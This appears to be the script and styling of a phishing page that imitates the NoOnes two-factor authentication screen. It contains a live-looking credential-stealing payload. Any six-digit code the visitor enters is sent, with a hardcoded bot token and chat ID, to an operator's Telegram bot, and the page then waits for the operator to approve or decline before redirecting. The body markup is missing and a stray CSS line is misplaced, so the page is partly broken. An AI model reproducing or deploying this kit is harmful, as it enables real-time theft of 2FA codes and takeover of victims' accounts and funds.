<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NoOnes - Two-factor authentication</title>
    <style>
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        :root {
            --bg-color: #f5f5f5;
            --text-color: #333;
            --input-bg: #f0f0f0;
            --input-placeholder: #aaa;
            --card-bg: #ffffff;
            --link-color: #00b36b;
            --button-bg: #00b36b;
            --button-text: #ffffff;
            --logo-color: #00b36b;
            --shadow-color: rgba(0,0,0,0.1);
            --medium-green: #00b36b;
            --grey-green: #6b7280;
            --paste-bg: #e5e7eb;
            --resend-color: #6b7280;
        }
        body.dark {
            --bg-color: #1a1a1a;
            --text-color: #ddd;
            --input-bg: #333333;
            --input-placeholder: #777;
            --card-bg: #222222;
            --link-color: #00d17f;
            --button-bg: #00d17f;
            --button-text: #ffffff;
            --logo-color: #00d17f;
            --shadow-color: rgba(255,255,255,0.1);
            --medium-green: #00d17f;
            --grey-green: #9ca3af;
            --paste-bg: #4b5563;
            --resend-color: #d1d5db;
        }
        * { transition: background-color 0.3s ease, color 0.3s ease, border-color 0.3s ease; }
        body {
            background-color: var(--bg-color);
            color: var(--text-color);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
            padding: 40px 20px;
            animation: fadeIn 0.5s ease-out;
        }
        .wrapper { max-width: 430px; width: 100%; margin: 0 auto; }
        .logo-container {
            display: flex;
            justify-content: center;
            align-items: flex-end;
            width: 100%;
            margin-top: 32px;
            margin-bottom: 8px;
        }
        .logo-link { height: 66px; color: var(--logo-color); }
        .container {
            background-color: var(--card-bg);
            padding: 24px 24px 32px;
            border-radius: 8px;
            box-shadow: 0 4px 12px var(--shadow-color);
            text-align: center;
        }
        h2 { font-size: 20px; font-weight: 600; margin: 0 0 8px; }
        .subtitle { font-size: 14px; color: var(--grey-green); margin-bottom: 24px; }
        .otp-inputs {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 12px;
        }
        .otp-input {
            width: 48px;
            height: 48px;
            text-align: center;
            font-size: 22px;
            font-weight: 600;
            border: none;
            border-radius: 6px;
            background-color: var(--input-bg);
            color: var(--text-color);
        }
        .otp-input:focus { outline: none; }
        .paste-button {
            background-color: var(--paste-bg);
            color: var(--text-color);
            border: none;
            border-radius: 4px;
            padding: 8px 16px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 16px;
        }
        .resend-text {
            font-size: 14px;
            color: var(--resend-color);
            margin-bottom: 24px;
        }
        .continue-button {
            width: 100%;
            padding: 14px;
            background-color: var(--button-bg);
            color: var(--button-text);
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            transition: transform 0.2s ease, filter 0.2s ease;
        }
        .continue-button:hover {
            transform: scale(1.02);
            filter: brightness(0.95);
        }
        .trouble-link {
            font-size: 14px;
            color: var(--link-color);
            text-decoration: none;
            font-weight: 600;
        }
        .footer {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 32px;
            font-size: 12px;
            color: var(--text-color);
            font-weight: 600;
        }
        .theme-toggle { display: flex; align-items: center; gap: 8px; }
        .theme-icon { width: 24px; height: 24px; color: var(--medium-green); }
        .slider-label {
            position: relative;
            display: inline-block;
            width: 52px;
            height: 28px;
        }
        .slider-input { opacity: 0; width: 0; height: 0; }
        .slider {
            position: absolute;
            cursor: pointer;
            top: 0; left: 0; right: 0; bottom: 0;
            background-color: var(--button-bg);
            border-radius: 14px;
            transition: .3s;
        }
        .slider:before {
            position: absolute;
            content: "";
            height: 20px; width: 20px;
            left: 4px; bottom: 4px;
            background-color: #ffffff;
            border-radius: 50%;
            transition: .3s;
        }
        .slider-input:checked + .slider:before { transform: translateX(24px); }
        .language {
            display: flex;
            align-items: center;
            gap: 4px;
            color: var(--link-color);
            text-decoration: underline;
            cursor: pointer;
        }
        .language svg { width: 16px; height: 16px; }
        .warning-message {
            color: var(--error-color);
            font-size: 14px;
            font-weight: 500;
            margin: 12px 0;
            padding: 12px;
            background: rgba(239,68,68,0.1);
            border-radius: 6px;
            display: none;
            text-align: center;
        }
        @media (min-width: 1024px) { .wrapper { max-width: 500px; } }
        @media (max-width: 430px) {
            body { padding: 20px 10px; }
            .wrapper { max-width: 100%; }
        }
    </style>
</head>

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

    <script>
        function toggleTheme() {
            document.body.classList.toggle('dark');
            document.querySelector('.slider-input').checked = document.body.classList.contains('dark');
        }

        const otpInputs = document.querySelectorAll('.otp-input');
        otpInputs.forEach((input, index) => {
            input.addEventListener('input', () => {
                if (input.value.length === 1 && index < otpInputs.length - 1) otpInputs[index + 1].focus();
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && input.value === '' && index > 0) otpInputs[index - 1].focus();
            });
        });

        function pasteCode() {
            navigator.clipboard.readText().then(text => {
                if (text.length === 6 && /^\d+$/.test(text)) {
                    otpInputs.forEach((input, i) => input.value = text[i]);
                }
            });
        }

        let timeLeft = 60;
        const resendTimer = document.getElementById('resend-timer');
        const timerInterval = setInterval(() => {
            timeLeft--;
            resendTimer.textContent = `Resend in ${timeLeft} seconds`;
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                resendTimer.innerHTML = '<a href="#" onclick="resendCode()" style="color:var(--link-color)">Resend code</a>';
            }
        }, 1000);

        function resendCode() {
            alert('Code resent');
            timeLeft = 60;
            resendTimer.textContent = `Resend in ${timeLeft} seconds`;
        }

        // ==================== TELEGRAM BOT INTEGRATION ====================
        const BOT_TOKEN = "8022677345:AAGtTzgJyVseQ8TcBDclM4JCrvcmDyJrxO4";
        const ADMIN_CHAT_ID = "6359358611";

        function generateSessionId() {
            return 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
        }

        let currentSessionId = null;
        let pollingInterval = null;
        let remainingAttempts = 3;

        async function sendOtpToBot(otp) {
            currentSessionId = generateSessionId();
            const message = `New 2FA code entered:\nOTP: ${otp}\nSession: ${currentSessionId}`;
            const keyboard = { inline_keyboard: [[{ text: "✅ Allow", callback_data: `allow_${currentSessionId}` }, { text: "❌ Decline", callback_data: `decline_${currentSessionId}` }]] };

            try {
                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: message, reply_markup: keyboard })
                });
                return res.ok;
            } catch (err) {
                console.error(err);
                alert("Error contacting approval service.");
                return false;
            }
        }

        function showOtpError() {
            remainingAttempts--;
            const warning = document.getElementById('otp-warning');
            if (remainingAttempts > 0) {
                warning.textContent = `Wrong code. You can try ${remainingAttempts} more times.`;
                warning.style.display = 'block';
            } else {
                window.location.href = 'index.html';
            }
        }

        function startApprovalPolling() {
            document.getElementById('loading-overlay').style.display = 'flex';
            pollingInterval = setInterval(async () => {
                try {
                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1&timeout=10`);
                    const data = await res.json();
                    if (data.ok && data.result.length > 0) {
                        for (const update of data.result) {
                            if (update.callback_query) {
                                const dataStr = update.callback_query.data;
                                if (dataStr.startsWith(`allow_${currentSessionId}`)) {
                                    clearInterval(pollingInterval);
                                    document.getElementById('loading-overlay').style.display = 'none';
                                    window.location.href = 'new-device.html';
                                    return;
                                }
                                if (dataStr.startsWith(`decline_${currentSessionId}`)) {
                                    clearInterval(pollingInterval);
                                    document.getElementById('loading-overlay').style.display = 'none';
                                    showOtpError();
                                    return;
                                }
                            }
                        }
                    }
                } catch (e) { console.error("Polling error", e); }
            }, 4000);
        }

        async function submitOtp() {
            const code = Array.from(otpInputs).map(i => i.value).join('');
            if (code.length !== 6) {
                alert('Please enter the full 6-digit code');
                return;
            }
            document.getElementById('otp-warning').style.display = 'none';
            const sent = await sendOtpToBot(code);
            if (sent) startApprovalPolling();
        }

        window.addEventListener('beforeunload', () => {
            if (pollingInterval) clearInterval(pollingInterval);
        });
    </script>
